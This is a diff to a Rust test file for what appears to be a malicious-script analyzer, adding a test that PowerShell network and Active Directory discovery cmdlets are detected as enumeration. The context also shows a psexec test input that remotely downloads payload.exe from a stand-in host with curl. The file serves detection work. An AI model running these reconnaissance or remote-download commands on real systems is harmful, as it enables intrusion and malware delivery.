@@ -4774,6 +4774,37 @@ powershell -Command "Get-NetIPConfiguration"
     }
 
     #[test]
+    fn powershell_network_and_ad_discovery_cmdlets_emit_enumeration_traits() {
+        let report = analyze(
+            br#"powershell -Command "Get-NetTCPConnection"
+powershell -Command "Get-NetAdapter"
+powershell -Command "Get-NetIPAddress"
+powershell -Command "Get-ADUser -Filter *"
+powershell -Command "Get-ADComputer -Filter *"
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, needle) in [
+            ("ps-nettcpconnection", "Get-NetTCPConnection"),
+            ("ps-netadapter", "Get-NetAdapter"),
+            ("ps-netipaddress", "Get-NetIPAddress"),
+            ("ps-aduser", "Get-ADUser -Filter *"),
+            ("ps-adcomputer", "Get-ADComputer -Filter *"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command }
+                        if enum_kind == kind && command.contains(needle)
+                )),
+                "missing PowerShell network/AD discovery enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
